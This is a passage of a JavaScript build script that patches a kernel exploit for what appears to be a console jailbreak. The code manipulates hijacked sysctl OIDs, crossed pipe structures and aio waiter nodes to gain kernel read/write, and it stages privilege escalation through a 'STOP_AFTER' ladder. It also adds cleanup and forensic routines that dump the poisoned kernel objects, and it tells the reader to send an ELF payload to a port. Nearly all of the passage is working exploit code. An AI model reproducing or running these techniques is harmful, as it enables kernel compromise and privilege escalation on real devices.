    };
    for (const [n, oid] of [["a", a], ["b", b], ["c", c]])
      await step("arg1(" + n + ")", async () => {
        await this.kwrite64(this.kaddr(oid.arg1), this.kaddr(oid.arg1Value));
      });
    for (const [n, oid] of [["a", a], ["b", b], ["c", c]])
      await step("kind(" + n + ")", async () =>
        this.kwrite32(this.kaddr(oid.kind), originalKind));
    await step("b.visible", async () => this.kwrite32(this.kaddr(b.visible), 0));
    await step("a.deadSink", async () => this.kwrite32(this.kaddr(a.deadSink), 0));
    await step("walkCounter", async () =>
      this.kwrite32(this.kaddr(this.off.walkCounter.addr), 0));
    this.mibC = null;
    this.oidsRestored = true;

    const cpus = await this.sysctlReadInt(this.mibA);
    const stillVisible = (await this.oidKind(this.mibB)) !== null;
    const ok = cpus.rv === 0 && !stillVisible;
    this.report("Cleanup", ok
      ? "oids restored through the slow window (pipes already disarmed)"
      : "SLOW OID RESTORE CHECK FAILED (kern.smp.cpus rv " + cpus.rv +
        ", oid b still visible: " + stillVisible + ")");
    return ok;
  }

  // Dump both used pipe structs against a pipe that has never been touched and
  // report every qword that still differs. This is how residue in a field the
  // offset table does not name - pipe_state, buffer accounting - becomes visible
  // instead of staying invisible. useSlow reads through the OID window, for the
  // dump that runs after the pipes are already disarmed.
  async dumpPipeStructs(label, useSlow) {
    const H = (v) => (v === null ? "-" : "0x" + v.toString());
    const rd = useSlow
      ? async (addr) => { const r = await this.kread64(addr); return r.rv === 0 ? r.value : null; }
      : async (addr) => this.readKernel64(addr);
    try {
      if (!this.master || !this.victim) { this.report(label, "no pipes"); return; }
      if (!this.curproc) await this.findCurrentProcess();
      const fdField = this.curproc.add32(this.off.proc.fd);
      const fdp = useSlow ? (await this.kread64(fdField)).value : await this.fptr(fdField);
      if (!fdp || !this.isKernelPointer(fdp)) { this.report(label, "no fd table"); return; }

      const pair = this.alloc(16);
      this.clear(pair, 16);
      if ((await this.sysInt(SYS_PIPE2, pair, 0)) !== 0) {
        this.report(label, "could not create the reference pipe");
        return;
      }
      const refFd = this.readU32(pair, 0) | 0;
      this.fds.push(refFd, this.readU32(pair, 4) | 0);
      const ref = await this.findPipe(fdp, refFd, "reference");
      if (!ref || !ref.pipe) { this.report(label, "reference pipe unresolved"); return; }

      const { buffer, count, in: inOff, out: outOff, size } = this.off.pipe;
      const known = {};
      known[buffer] = "buffer"; known[count] = "count"; known[inOff] = "in";
      known[outOff] = "out"; known[size] = "size";
      const dumps = {};
      for (const [name, addr] of [["master", this.master.pipe],
                                  ["victim", this.victim.pipe],
                                  ["reference", ref.pipe]]) {
        const words = [];
        for (let off = 0; off < 0x100; off += 8) {
          const w = await rd(addr.add32(off));
          words.push(w === null ? "?" : w.toString());
        }
        dumps[name] = words;
        this.report(label, name + " @ " + H(addr));
      }
      for (const name of ["master", "victim"]) {
        const diffs = [];
        for (let i = 0; i < 0x100 / 8; i++) {
          const off = i * 8;
          if (dumps[name][i] !== dumps.reference[i])
            diffs.push("+0x" + off.toString(16) + (known[off] ? " (" + known[off] + ")" : "") +
              ": " + name + "=" + dumps[name][i] + " fresh=" + dumps.reference[i]);
        }
        this.report(label, name + " differs from a fresh pipe at " + diffs.length + " qword(s)");
        for (const d of diffs.slice(0, 16)) this.report(label, "  " + d);
      }
    } catch (e) {
      this.report(label, "failed: " + e.message);
    }
  }

  // Build L: a pipe that has never been touched, created while the fast path is
  // still alive so its struct address can be resolved. pipeclean.elf dumps both
  // used pipes against it, which is how residue in a field the offset table does
  // not name - pipe_state, the pipe_map direct-write pair - becomes visible
  // instead of being guessed at. Left open on purpose: closing it would free the
  // struct being compared against.
  async makeReferencePipe(label) {
    try {
      const pair = this.alloc(16);
      this.clear(pair, 16);
      if ((await this.sysInt(SYS_PIPE2, pair, 0)) !== 0) {
        this.report(label, "pipe2 failed");
        return null;
      }
      const readFd = this.readU32(pair, 0) | 0;
      const writeFd = this.readU32(pair, 4) | 0;
      this.fds.push(readFd, writeFd);
      const fdp = await this.fptr(this.curproc.add32(this.off.proc.fd));
      if (!fdp) { this.report(label, "no fd table"); return null; }
      const info = await this.findPipe(fdp, readFd, "reference");
      if (!info || !info.pipe) { this.report(label, "reference pipe unresolved"); return null; }
      this.refPipe = info.pipe;
      this.report(label, "reference pipe @ 0x" + info.pipe.toString() +
        " (fds " + readFd + "/" + writeFd + ", never written)");
      return info.pipe;
    } catch (e) {
      this.report(label, "failed: " + e.message);
      return null;
    }
  }

  // Build I: leave nothing behind. The order is forced by which primitive each
  // step needs. disarmPipes() makes one fast write and then needs the slow OID
  // window for the master's buffer and the eight head fields; defuseAioGroups()
  // needs that window; restoring the OIDs is what closes it. Upstream defuses
  // inside run() and restores the OIDs through the pipes, which is why its
  // restorePipes() can only ever disarm one side and leaves the victim's buffer
  // aimed at the master's struct - the residue Build H proved is fatal on its
  // own, with no escalation and no kexp involved.
  async cleanTeardown() {
    if (typeof PIPE_STRUCT_DIFF !== "undefined" && PIPE_STRUCT_DIFF && this.crossed)
      await this.dumpPipeStructs("pipe-diff-crossed", false);

    if (typeof AIO_POISON_SNAPSHOT !== "undefined" &&
        AIO_POISON_SNAPSHOT && this.crossed)
      await this.verifyAioPoison("poison-verify");
    if (typeof AIO_POISON_SCRUB !== "undefined" && AIO_POISON_SCRUB && this.crossed)
      await this.scrubAioPoison("poison-scrub");

    let disarmed;
    if (!this.crossed) {
      disarmed = true;
    } else if (typeof RESTORE_REAL_BUFFERS !== "undefined" && RESTORE_REAL_BUFFERS) {
      disarmed = await this.restoreRealBuffers();
      if (!disarmed) {
        this.report("Cleanup", "restore failed - falling back to zeroing the buffers, " +
          "which is the state Build U panicked from");
        disarmed = await this.disarmPipes();
      }
    } else {
      disarmed = await this.disarmPipes();
    }
    this.crossed = false;
    this.report("Cleanup", "pipes made safe: " + disarmed +
      (disarmed ? "" : " - a pipe may still be armed, closing the host app can panic"));

    if (typeof PIPE_STRUCT_DIFF !== "undefined" && PIPE_STRUCT_DIFF)
      await this.dumpPipeStructs("pipe-diff-disarmed", true);

    // No defuse here: rescue() already ran it before this branch, and the slow
    // window survives that (it rides the reclaimed objects, not the waiter list
    // heads). What is left is the OID restore, which is also what closes it.
    //
    // Build O skips it on purpose. restoreOidsSlow() cannot succeed in principle:
    // OID b IS the window (writes land at b.arg1) and b.kind is what makes it
    // writable, so restoring b.kind needs a write through a window that no longer
    // exists. Build J died in here, and the state "both pipes zeroed, OIDs left
    // hijacked, then close the app" has consequently never been tested - even
    // though Build G proved hijacked OIDs survive a close on their own. This is
    // the last clean state available to a minimal run, and it is the one that
    // decides whether zeroing the pipes is a fix or a red herring.
    if (typeof SKIP_OID_RESTORE !== "undefined" && SKIP_OID_RESTORE) {
      this.report("Cleanup", "SKIP_OID_RESTORE: pipes disarmed, OIDs left hijacked " +
        "(the slow window cannot restore its own writable kind)");
      this.oidsRestored = false;
    } else {
      this.report("Cleanup", "slow-oid restore starting (window still hijacked)");
      await this.restoreOidsSlow();
    }

    if (typeof SKIP_RELEASE_WORKERS !== "undefined" && SKIP_RELEASE_WORKERS)
      this.report("Cleanup", "SKIP_RELEASE_WORKERS: leaving the aio workers parked");
    else await this.releaseAioWorkers();
    await sleep(200);
    await this.closeScratchDescriptors();
    // Derived from what was actually achieved. This line used to say "pipes
    // disarmed, oids restored" unconditionally, and on the shipped configuration
    // it printed that one line after the line saying the OIDs were left hijacked.
    // Third instance of the same bug as the eboot "verified" and the fhold "4/4":
    // a success message not derived from a readback.
    this.report("Cleanup", "clean teardown done: pipes " +
      (disarmed ? "safe (real buffers restored)" : "MAY STILL BE ARMED - closing can panic") +
      ", groups defused, oids " +
      (this.oidsRestored ? "restored" : "LEFT HIJACKED until reboot") +
      ", workers released, scratch fds closed");
  }

  async restorePipes() {
    if (this.disarmed) return;`,
  "disarmPipes",
);


// edit 6/9: record that the sysctl tree is clean again
stage = replaceOnce(
  stage,
  `    this.mibC = null;

    const cpus = await this.sysctlReadInt(this.mibA);`,
  `    this.mibC = null;
    this.oidsRestored = true;

    const cpus = await this.sysctlReadInt(this.mibA);`,
  "oidsRestored flag",
);

must(!stage.includes("import("), "upstream still has a dynamic import");
must(!stage.includes("export "), "upstream still has an export");
must(!/window\.[A-Za-z]/.test(stage), "upstream still references window.*");

// edit 7/9: bisect ladder - optional stop points inside upstream run()
for (const [label, needle, stop] of [
  ["arm",
    `      this.report("Kernel", "read and write ready");`,
    `      if (typeof STOP_AFTER !== "undefined" && STOP_AFTER === "arm")
        return this.stop("STOP_AFTER=arm - slow r/w only, no pipes, no escalate");`],
  ["locate",
    `      if (!(await this.locatePipes())) return this.stop("pipes not located");`,
    `      if (typeof STOP_AFTER !== "undefined" && STOP_AFTER === "locate")
        return this.stop("STOP_AFTER=locate - both pipe pairs created and located, " +
          "never crossed, fast r/w never established");`],
  ["fast",
    `      this.report("Kernel", "fast read and write ready");`,
    `      if (typeof STOP_AFTER !== "undefined" && STOP_AFTER === "fast")
        return this.stop("STOP_AFTER=fast - pipes crossed, aio groups still armed");`],
  ["defuse",
    `      this.report("Kernel", "checking aio groups");
      await this.defuseAioGroups();`,
    `      if (typeof STOP_AFTER !== "undefined" && STOP_AFTER === "defuse")
        return this.stop("STOP_AFTER=defuse - aio groups cleared, privileges untouched");`],
  ["escalate",
    `      this.report("Kernel", "privileges ready");`,
    `      if (typeof STOP_AFTER !== "undefined" && STOP_AFTER === "escalate")
        return this.stop("STOP_AFTER=escalate - full jailbreak, no handoff");`],
]) {
  stage = replaceOnce(stage, needle, needle + "\n" + stop, "STOP_AFTER " + label);
}

// The ladder appends each stop after its needle, so a replacement that repeats the
// needle duplicates the call and demotes the stop into the body of an if that may
// never run. That is syntactically valid: Build P shipped with crossPipes() called
// twice, the first call crossing the pipes and the locate stop unreachable, and
// both node --check and hostcheck passed it. Counting the calls that must appear
// exactly once catches it at build time instead of on hardware.
// defuseAioGroups() is deliberately not in this list: edit 7b adds a second call
// site in rescue() for CLEAN_TEARDOWN, so two copies is correct there.
for (const call of ["await this.armKernelReadWrite()", "await this.locatePipes()",
  "await this.crossPipes()", "await this.escalate()"])
  must(stage.split(call).length - 1 === 1,
    "ladder duplicated '" + call + "' (" + (stage.split(call).length - 1) +
    " copies) - a rung's replacement repeated its own needle");

// The save has to happen inside crossPipes(), before the six field writes that
// overwrite master.buffer. Needle is unique to that function. It runs for the note
// too, not just for the restore: option B leaves the pipes armed and hands the
// addresses to pipeclean.elf instead of restoring them from JS.
stage = replaceOnce(stage,
  `    this.pipeSize = this.off.pipe.defaultSize;`,
  `    this.pipeSize = this.off.pipe.defaultSize;
    if ((typeof RESTORE_REAL_BUFFERS !== "undefined" && RESTORE_REAL_BUFFERS) ||
        (typeof PIPE_NOTE_FOR_CLEANER !== "undefined" && PIPE_NOTE_FOR_CLEANER))
      await this.savePipeBuffers();`,
  "save the real pipe buffers before crossing");

// Option B: leave the pair crossed so elfldr's kernel r/w stays usable after the
// payload returns, and let pipeclean.elf write the real buffers back before the app
// is closed. restorePipes() is the thing that must not run - it leaves the victim
// aimed at the master struct, which makes pipe_dtor() call kmem_free() on a live
// pipepair.
stage = replaceOnce(stage,
  "  async restorePipes() {",
  `  async restorePipes() {
    if (typeof LEAVE_PIPES_ARMED !== "undefined" && LEAVE_PIPES_ARMED) {
      this.report("pipes", "the pair is left crossed on purpose so elfldr keeps kernel " +
        "r/w. Send the pipeclean seal ELF to :9021 BEFORE closing the app - closing " +
        "with the pipes still armed panics the console.");
      return;
    }`,
  "LEAVE_PIPES_ARMED gate in restorePipes");

// edit 7b: with CLEAN_TEARDOWN the group defuse moves to rescue(), so the slow
// window is still alive when disarmPipes() needs it for the master's buffer.
stage = replaceOnce(
  stage,
  `      this.report("Kernel", "checking aio groups");
      await this.defuseAioGroups();`,
  `      this.report("Kernel", "checking aio groups");
      if (typeof CLEAN_TEARDOWN !== "undefined" && CLEAN_TEARDOWN)
        this.report("Kernel", "CLEAN_TEARDOWN: the group defuse is deferred to " +
          "rescue(), so the slow window is still alive when the pipes are " +
          "disarmed");
      else await this.defuseAioGroups();`,
  "defer the group defuse",
);

// edit 8/9: aio forensics + the leak-on-exit fix, and a rescue() order that
// keeps kernel r/w alive until after the parked workers are released
stage = replaceOnce(
  stage,
  `        this.writeU32(ids, sent * 4, id);
        sent++;`,
  `        this.writeU32(ids, sent * 4, id);
        (this.parkedIds || (this.parkedIds = [])).push(id);
        sent++;`,
  "record parked aio ids",
);

stage = replaceOnce(
  stage,
  `      await this.restoreOids();
      await this.restorePipes();
      await this.releaseAioWorkers();
      await this.closeScratchDescriptors();`,
  `      if (typeof CLEAN_TEARDOWN !== "undefined" && CLEAN_TEARDOWN) {
        await this.cleanTeardown();
        return;
      }

      if (typeof PIPE_NOTE_FOR_CLEANER !== "undefined" && PIPE_NOTE_FOR_CLEANER)
        await this.makeReferencePipe("pipe-ref");

      if (typeof SKIP_OID_RESTORE !== "undefined" && SKIP_OID_RESTORE)
        this.report("Cleanup", "SKIP_OID_RESTORE: the sysctl OIDs are being left " +
          "hijacked on purpose - diagnostic build, the window stays open");
      else await this.restoreOids();

      // Verify and scrub both run before releaseAioWorkers(): verify so that
      // "changed" means the slab moved on its own rather than our own writes,
      // and scrub so that no woken worker can find a live fake node. Both still
      // have the crossed pipes, which restorePipes() is what destroys.
      if (typeof AIO_POISON_SNAPSHOT !== "undefined" &&
          AIO_POISON_SNAPSHOT && this.crossed)
        await this.verifyAioPoison("poison-verify");
      if (typeof AIO_POISON_SCRUB !== "undefined" &&
          AIO_POISON_SCRUB && this.crossed)
        await this.scrubAioPoison("poison-scrub");

      // Reordered from upstream (releaseAioWorkers used to run after
      // restorePipes): the workers have to be awake before we can look at - or
      // leak - the aio state, and both need the crossed pipes, which
      // restorePipes() is what destroys. releaseAioWorkers() only closes two
      // fds, so moving it earlier changes nothing else.
      if (typeof SKIP_RELEASE_WORKERS !== "undefined" && SKIP_RELEASE_WORKERS)
        this.report("Cleanup", "SKIP_RELEASE_WORKERS: leaving the aio workers parked");
      else await this.releaseAioWorkers();
      await sleep(200);

      if (typeof AIO_DUMP_AFTER_RELEASE !== "undefined" &&
          AIO_DUMP_AFTER_RELEASE && this.crossed)
        await this.dumpAioState("aio-dump");
      if (typeof AIO_CANCEL_ALL !== "undefined" && AIO_CANCEL_ALL) {
        await this.cancelAllAio("aio-cancel");
        if (this.crossed) await this.dumpAioState("aio-after-cancel");
      }
      if (typeof AIO_LEAK_ON_EXIT !== "undefined" && AIO_LEAK_ON_EXIT &&
          this.crossed)
        await this.leakAioInfo("aio-leak");

      // Build N: hold the pipe files on the minimal path too. launchShellcode()
      // already does this on the production path, which is why production runs
      // report 4/4 and still panic on close - their pipes are not torn down
      // either, so their panic has a different cause from Build H's. Keeping the
      // crossing and the armed victim while removing the teardown is the only
      // variable left between the two.
      if (typeof FHOLD_AT_RESCUE !== "undefined" && FHOLD_AT_RESCUE)
        await this.holdPipeFiles("rescue fhold");

      await this.restorePipes();
      await this.closeScratchDescriptors();`,
  "rescue order",
);

stage = replaceOnce(
  stage,
  "  async restorePipes() {",
  `  // readKernelPointer() is built on kread64, i.e. the slow sysctl-OID window,
  // which restoreOids() closes. Everything below runs after that point, so it
  // needs the crossed pipes: same validation, fast path. Using the slow one
  // here is what made p_aioinfo look NULL and made the scrub see no nodeMutex.
  async fptr(address) {
    const v = await this.readKernel64(address);
    return this.isKernelPointer(v) ? v : null;
  }

  // Read one aio id-table slot without validating it, so a slot that the
  // exploit left in an odd state is visible instead of being filtered out the
  // way lookupAioGroup() filters. Fast (pipe) path only - this runs after the
  // sysctl OIDs are back, so the slow window is gone.
  async aioSlot(table, id) {
    const { pages, slotStride } = this.off.aio.idTable;
    const index = id & 0x1fff;
    const pageCount = await this.readKernel32(table.add32(pages));
    if (pageCount === 0 || pageCount > 64 || index >= (pageCount << 7)) return null;
    const page = await this.fptr(table.add32((index >>> 7) * 8));
    if (!page) return null;
    const slot = page.add32((id & 0x7f) * slotStride);
    const w24 = await this.readKernel32(slot.add32(0x24));
    return {
      slot: slot,
      type: await this.readKernel32(slot.add32(0x20)),
      state: w24 >>> 16,
      freeNext: w24 & 0xffff,
      gen: await this.readKernel32(slot.add32(0x28)),
      obj: await this.fptr(slot.add32(0x10)),
    };
  }

  // What does the process's aio state look like once the exploit is finished and
  // the parked workers have been woken? Every run that died on closing the host
  // app had been through the aio race; the one run that survived never started
  // it. At exit the kernel walks this process's aio structures, and the race
  // freed and reclaimed objects that are still reachable from them.
  async dumpAioState(label) {
    const K = (v) => v !== null && ((v.hi >>> 16) === 0xffff);
    const H = (v) => (v === null ? "-" : "0x" + v.toString());
    try {
      if (!this.curproc) await this.findCurrentProcess();
      const table = await this.fptr(
        this.curproc.add32(this.off.proc.aioInfo));
      if (!table) { this.report(label, "p_aioinfo is NULL"); return; }

      const head = [];
      for (let off = 0; off < 0x40; off += 8)
        head.push("+" + off.toString(16) + "=" +
          H(await this.readKernel64(table.add32(off))));
      this.report(label, "aioinfo " + H(table) + " " + head.join(" "));
      this.report(label, "idTable pages " +
        (await this.readKernel32(table.add32(this.off.aio.idTable.pages))));

      const { num, state, waiters } = this.off.aio.group;
      const ids = [];
      for (const group of this.armedGroups) for (const id of group) ids.push(id);
      const parked = this.parkedIds || [];
      this.report(label, "tracking " + ids.length + " armed-group ids and " +
        parked.length + " parked-job ids");

      const tally = {};
      let armedLeft = 0;
      const samples = [];
      for (const id of ids) {
        const s = await this.aioSlot(table, id);
        if (!s) { tally.missing = (tally.missing || 0) + 1; continue; }
        const key = "armed type=" + (s.type & 0xffff) + " state=" + s.state;
        tally[key] = (tally[key] || 0) + 1;
        if (s.obj) {
          // num/state/waiters are fields of the shared struct at obj+0x10, the
          // way defuseAioGroups() reaches them. Reading them off obj directly
          // yields the request id where a state should be, which is how a
          // fully-defused run came to look like 30 groups still armed.
          const shared = await this.fptr(s.obj.add32(0x10));
          const gState = shared ? await this.readKernel32(shared.add32(state)) : -1;
          const gNum = shared ? await this.readKernel32(shared.add32(num)) : -1;
          const gWait = shared ? await this.readKernel64(shared.add32(waiters)) : null;
          if (gWait && (gWait.low !== 0 || gWait.hi !== 0)) armedLeft++;
          if (samples.length < 6)
            samples.push("  id " + id + " obj " + H(s.obj) + " shared " + H(shared) +
              " num " + gNum + " state " + gState + " waiters " + H(gWait) +
              (!gWait ? " (unreachable)" :
                (gWait.low === 0 && gWait.hi === 0 ? " (clear)" : "  <-- STILL ARMED")));
        } else if (samples.length < 6) {
          samples.push("  id " + id + " obj - (slot type " + s.type +
            " state " + s.state + " gen " + s.gen + ")");
        }
      }
      for (const k of Object.keys(tally)) this.report(label, "armed slots: " + k + " x" + tally[k]);
      for (const s of samples) this.report(label, s);
      this.report(label, armedLeft + " armed groups still have a waiters list");

      const ptally = {};
      const psamples = [];
      for (const id of parked) {
        const s = await this.aioSlot(table, id);
        if (!s) { ptally.missing = (ptally.missing || 0) + 1; continue; }
        const key = "type=" + (s.type & 0xffff) + " state=" + s.state;
        ptally[key] = (ptally[key] || 0) + 1;
        if (psamples.length < 6)
          psamples.push("  parked id " + id + " type " + (s.type & 0xffff) +
            " state " + s.state + " obj " + H(s.obj) + " gen " + s.gen);
      }
      for (const k of Object.keys(ptally)) this.report(label, "parked slots: " + k + " x" + ptally[k]);
      for (const s of psamples) this.report(label, s);
    } catch (e) {
      this.report(label, "dump failed: " + e.message);
    }
  }

  // Detach the process from its aio state so the exit path has nothing to walk.
  // The structures leak instead of being freed, which is the point: whatever the
  // race left reachable from them stays valid, and a parked worker that wakes up
  // later still finds real memory. p_aioinfo is NULL for every process that
  // never used aio, so the teardown path has to handle NULL already.
  async leakAioInfo(label) {
    const K = (v) => v !== null && ((v.hi >>> 16) === 0xffff);
    const H = (v) => (v === null ? "-" : "0x" + v.toString());
    try {
      if (!this.curproc) await this.findCurrentProcess();
      const field = this.curproc.add32(this.off.proc.aioInfo);
      const before = await this.fptr(field);
      if (!before) { this.report(label, "p_aioinfo already NULL"); return; }
      const ok = await this.writeKernel64(field, 0, 0);
      const after = await this.fptr(field);
      this.report(label, "p_aioinfo " + H(before) + " -> " + H(after) +
        " (wrote " + (ok ? "ok" : "FAILED") + ") - the aio structures are " +
        "leaked on purpose so process exit does not walk them");
    } catch (e) {
      this.report(label, "failed: " + e.message);
    }
  }

  async restorePipes() {`,
  "aio forensics",
);

// edit 9/10: read-only dump of the reclaimed aio waiter arrays
stage = replaceOnce(
  stage,
  `        const head = await this.kread64(shared.add32(waiters));
        if (head.value.low === 0 && head.value.hi === 0) {
          alreadyClear++;
          continue;
        }
`,
  `        const head = await this.kread64(shared.add32(waiters));
        if (head.value.low === 0 && head.value.hi === 0) {
          alreadyClear++;
          continue;
        }

        // Is the reclaimed waiter array still holding the fake nodes
        // buildWaiterNodes() put there (firstTarget / secondTarget / nodeMutex)?
        // defuseAioGroups() only clears the list head; the array itself goes
        // back to the slab with those bytes intact, for whatever is allocated
        // there next to inherit.
        if (typeof AIO_DUMP_WAITERS !== "undefined" && AIO_DUMP_WAITERS &&
            this.isKernelPointer(head.value) && this._waiterDumps < 3) {
          this._waiterDumps++;
          const words = [];
          for (let off = 0; off < 0x40; off += 8) {
            const w = await this.kread64(head.value.add32(off));
            words.push("+" + off.toString(16) + "=" +
              (w.rv === 0 ? "0x" + w.value.toString() : "?"));
          }
          this.report("aio-waiters", "group id " + id + " array @ 0x" +
            head.value.toString() + " (kbase 0x" + this.kbase.toString() +
            ", nodeMutex 0x" + this.kaddr(this.off.nodeMutex).toString() + ")");
          this.report("aio-waiters", "  " + words.join(" "));
        }
`,
  "aio waiter dump",
);

// edit 10/12: Build A of the close-panic hunt - enumerate the poisoned aio
// objects while the id table is alive, then re-read them at teardown. Read-only:
// it records and reports, and changes no kernel state.
//
// Diagnostic only, and the largest single block in the build: it is what pushed
// production past the loader limit, so it is behind --diag.
if (diag) {
stage = replaceOnce(
  stage,
  `      if ((this.readU32(returns, i * 8) | 0) === 0) accepted++;
    return accepted;`,
  `      if ((this.readU32(returns, i * 8) | 0) === 0) accepted++;
    // These ids are the only handle on the aio objects that aio_submit_cmd
    // copied the fake waiter nodes into, and the buffer holding them is local
    // to this function - nothing upstream remembers them.
    if (typeof AIO_POISON_SNAPSHOT !== "undefined" && AIO_POISON_SNAPSHOT) {
      const sprayed = this.sprayedIds || (this.sprayedIds = []);
      for (let i = 0; i < sprays * requests; i++)
        sprayed.push(this.readU32(sprayedIds, i * 4) >>> 0);
    }
    return accepted;`,
  "record sprayed aio ids",
);

stage = replaceOnce(
  stage,
  `      this.report("Kernel", "fast read and write ready");`,
  `      this.report("Kernel", "fast read and write ready");
      if (typeof AIO_POISON_SNAPSHOT !== "undefined" && AIO_POISON_SNAPSHOT)
        await this.snapshotAioPoison("poison-snap");`,
  "poison snapshot call site",
);

stage = replaceOnce(
  stage,
  "  async restorePipes() {",
  `  // Build A, pass 1. Two separate walks, because they answer different things:
  // the armed groups' waiter arrays (where the poison actually is, and the only
  // structures worth scrubbing) get a complete enumeration, while the object
  // dump stays a capped sample for statistics. Every pointer dereferenced here
  // has been validated the way lookupAioGroup() validates it - Build A1 read the
  // object field of dead slots and faulted the console.
  async snapshotAioPoison(label) {
    const H = (v) => (v === null ? "-" : "0x" + v.toString());
    const K = (v) => v !== null && ((v.hi >>> 16) === 0xffff);
    const hex = (ws) => ws.map((w, i) => "+" + (i * 8).toString(16) + "=0x" +
      w.toString()).join(" ");
    const idMax = (typeof POISON_ID_MAX !== "undefined" && POISON_ID_MAX) || 512;
    const objMax = (typeof POISON_SNAPSHOT_MAX !== "undefined" && POISON_SNAPSHOT_MAX) || 32;
    const waiterMax = (typeof POISON_WAITER_MAX !== "undefined" && POISON_WAITER_MAX) || 64;
    try {
      if (!this.curproc) await this.findCurrentProcess();
      const table = await this.fptr(this.curproc.add32(this.off.proc.aioInfo));
      const sprayIds = this.sprayedIds || [];
      const armed = [];
      for (const g of this.armedGroups) for (const id of g) armed.push(id);
      const nodeMutex = this.kaddr(this.off.nodeMutex);
      this.report(label, "p_aioinfo " + H(table) + ", " + armed.length +
        " armed ids and " + sprayIds.length + " sprayed, kbase 0x" +
        this.kbase.toString() + ", nodeMutex 0x" + nodeMutex.toString());
      if (!table) {
        this.report(label, "p_aioinfo is NULL - nothing is reachable from the " +
          "process, so this pass cannot enumerate anything");
        this.poisonSnapshot = [];
        this.poisonWaiters = [];
        return;
      }

      const { entryType } = this.off.aio.idTable;
      const { waiters } = this.off.aio.group;
      const live = async (id) => {
        const s = await this.aioSlot(table, id);
        if (!s) return null;
        const index = id & 0x1fff;
        const genOk = ((((s.gen & 0xffff) << 13) | index) & 0xffff) === id;
        if (s.state !== 3 || (s.type & 0xffff) !== entryType || !genOk) return "dead";
        return s.obj ? s : null;
      };

      // --- every armed group's waiter array, complete ---
      const waiterRecs = [];
      const seenHeads = {};
      let cleared = 0, dead = 0, noObj = 0, noShared = 0, oddHead = 0;
      for (const id of armed) {
        if (waiterRecs.length >= waiterMax) break;
        const s = await live(id);
        if (s === "dead") { dead++; continue; }
        if (!s) { noObj++; continue; }
        const shared = await this.fptr(s.obj.add32(0x10));
        if (!shared) { noShared++; continue; }
        const head = await this.fptr(shared.add32(waiters));
        if (!head) {
          const raw = await this.readKernel64(shared.add32(waiters));
          if (raw && raw.low === 0 && raw.hi === 0) cleared++; else oddHead++;
          continue;
        }
        if (seenHeads[head.toString()]) continue;
        seenHeads[head.toString()] = true;
        const hwords = [];
        let hok = true;
        for (let off = 0; off < 0x28; off += 8) {
          const w = await this.readKernel64(head.add32(off));
          if (w === null) { hok = false; break; }
          hwords.push(w);
        }
        if (!hok) continue;
        const sig = K(hwords[0]) && K(hwords[1]) &&
          hwords[2].toString() === nodeMutex.toString();
        waiterRecs.push({ id: id, obj: s.obj, shared: shared, addr: head,
          words: hwords, sig: sig });
        this.report(label, "  waiter array for armed id " + id + " @ " + H(head) +
          " (shared " + H(shared) + ")" + (sig ? "  <-- SIGNATURE" : "") +
          "\\n    " + hex(hwords));
      }
      this.poisonWaiters = waiterRecs;
      this.report(label, "armed groups: " + waiterRecs.length + " unique waiter " +
        "arrays still linked, " + cleared + " already clear (defused), " + dead +
        " dead slots, " + noObj + " with no object, " + noShared +
        " with no shared, " + oddHead + " with a non-kernel head");

      // --- capped sample of the objects behind the ids, for statistics ---
      const ids = [];
      for (const id of armed) ids.push(["armed", id]);
      for (const id of sprayIds) ids.push(["spray", id]);
      const seen = {};
      const snap = [];
      let walked = 0, sDead = 0, sNoObj = 0, unreadable = 0, poisoned = 0;
      let other = 0, left = 0;
      const samples = [];
      for (const [kind, id] of ids) {
        if (walked >= idMax || snap.length >= objMax) { left++; continue; }
        walked++;
        const s = await live(id);
        if (s === "dead") { sDead++; continue; }
        if (!s) { sNoObj++; continue; }
        const key = s.obj.toString();
        if (seen[key]) continue;
        seen[key] = true;
        const words = [];
        let ok = true;
        for (let off = 0; off < 0x28; off += 8) {
          const w = await this.readKernel64(s.obj.add32(off));
          if (w === null) { ok = false; break; }
          words.push(w);
        }
        if (!ok) { unreadable++; continue; }
        const sig = K(words[0]) && K(words[1]) &&
          words[2].toString() === nodeMutex.toString();
        if (sig) poisoned++; else other++;
        snap.push({ kind: kind, id: id, obj: s.obj, words: words, sig: sig });
        if (samples.length < 4)
          samples.push("  " + kind + " id " + id + " obj " + H(s.obj) +
            (sig ? "  <-- SIGNATURE" : "") + "\\n    " + hex(words));
      }
      this.poisonSnapshot = snap;
      this.report(label, "objects: walked " + walked + " of " + ids.length +
        " ids (" + left + " skipped by the caps) - " + snap.length + " live, " +
        poisoned + " carrying the fake-node signature, " + other + " other, " +
        sDead + " dead slots not followed, " + sNoObj + " with no object, " +
        unreadable + " unreadable");
      for (const x of samples) this.report(label, x);
    } catch (e) {
      this.report(label, "snapshot failed: " + e.message);
    }
  }

  // Build A, pass 2: re-read what pass 1 recorded, by address, and also re-read
  // each array's list head - a head that points back at the array means
  // something re-linked it after defuseAioGroups() cleared it.
  async verifyAioPoison(label) {
    const H = (v) => (v === null ? "-" : "0x" + v.toString());
    const reread = async (recs, what) => {
      let same = 0, sigLeft = 0, changed = 0, unreadable = 0;
      const samples = [];
      for (const e of recs) {
        const now = [];
        let ok = true;
        for (let off = 0; off < 0x28; off += 8) {
          const w = await this.readKernel64((e.addr || e.obj).add32(off));
          if (w === null) { ok = false; break; }
          now.push(w);
        }
        if (!ok) { unreadable++; continue; }
        const identical = now.every((w, i) => w.toString() === e.words[i].toString());
        if (identical) { same++; if (e.sig) sigLeft++; continue; }
        changed++;
        if (samples.length < 6)
          samples.push("  " + what + " id " + e.id + " @ " + H(e.addr || e.obj) +
            (e.sig ? " (had SIGNATURE)" : "") + "\\n    was " +
            e.words.map((w) => w.toString()).join(" ") + "\\n    now " +
            now.map((w) => w.toString()).join(" "));
      }
      this.report(label, what + ": re-read " + recs.length + " - " + same +
        " byte-identical (" + sigLeft + " still carrying the fake-node " +
        "signature), " + changed + " changed since the race, " + unreadable +
        " now unreadable");
      for (const x of samples) this.report(label, x);
    };
    try {
      const snap = this.poisonSnapshot || [];
      const waits = this.poisonWaiters || [];
      if (!snap.length && !waits.length) {
        this.report(label, "nothing was snapshotted - pass 1 found no objects");
        return;
      }
      if (waits.length) {
        const { waiters } = this.off.aio.group;
        let linked = 0, clear = 0, moved = 0;
        for (const e of waits) {
          const head = await this.readKernel64(e.shared.add32(waiters));
          if (head.low === 0 && head.hi === 0) clear++;
          else if (head.toString() === e.addr.toString()) linked++;
          else moved++;
        }
        this.report(label, "list heads: " + clear + " clear, " + linked +
          " still pointing at their array, " + moved + " pointing somewhere else");
      }
      if (waits.length) await reread(waits, "waiter arrays");
      if (snap.length) await reread(snap, "objects");
    } catch (e) {
